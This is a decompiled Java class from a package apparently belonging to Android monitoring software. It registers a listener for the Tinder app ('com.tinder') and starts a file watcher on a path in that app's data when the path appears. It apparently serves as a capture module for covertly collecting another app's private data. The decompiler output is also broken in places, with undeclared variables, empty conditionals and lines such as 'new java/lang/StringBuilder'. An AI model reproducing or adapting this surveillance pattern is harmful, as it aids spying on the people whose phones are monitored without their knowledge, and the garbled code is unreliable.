package com.vvt.capture.tinder.a;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.io.j;
import com.vvt.io.m;
import java.io.File;

public class b
  implements e, m
{
  private static final String a = b.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.b;
  private static final boolean d = com.vvt.ak.a.e;
  private c e;
  private i f;
  private j g;
  private boolean h;
  
  public void a(i parami)
  {
    boolean bool = b;
    if (bool) {}
    bool = true;
    this.h = bool;
    this.f = parami;
    j localj = this.g;
    if (localj == null)
    {
      localj = j.a();
      this.g = localj;
    }
    localj = this.g;
    String str = "com.tinder";
    localj.a(str, this);
    bool = b;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    bool = b;
    if (bool) {}
    try
    {
      localc = this.e;
      if (localc != null)
      {
        bool = c;
        if (bool) {}
        localc = this.e;
        localc.stopWatching();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        c localc;
        bool = d;
        if (!bool) {}
      }
    }
    localc = null;
    this.e = null;
    bool = b;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2) {}
  
  public void b()
  {
    boolean bool = b;
    if (bool) {}
    bool = false;
    Object localObject = null;
    try
    {
      this.h = false;
      localObject = this.e;
      if (localObject != null)
      {
        bool = b;
        if (bool) {}
        localObject = this.e;
        ((c)localObject).stopWatching();
      }
      localObject = this.g;
      if (localObject != null)
      {
        localObject = this.g;
        String str = "com.tinder";
        ((j)localObject).a(str);
      }
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = d;
        if (!bool) {}
      }
    }
  }
  
  public void b(String paramString1, String paramString2)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = com.vvt.n.a.f.a.a(paramString2);
    Object localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject2 = ((StringBuilder)localObject2).append(paramString2);
    String str = File.separator;
    localObject1 = str + (String)localObject1;
    localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    boolean bool2 = ((File)localObject2).exists();
    if (bool2)
    {
      localObject2 = this.e;
      if (localObject2 == null)
      {
        bool2 = c;
        if (bool2) {}
        localObject2 = new com/vvt/capture/tinder/a/c;
        ((c)localObject2).<init>(this, (String)localObject1);
        this.e = ((c)localObject2);
        localObject1 = this.e;
        ((c)localObject1).startWatching();
      }
    }
    bool1 = b;
    if (bool1) {}
  }
  
  public void c(String paramString1, String paramString2) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/tinder/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */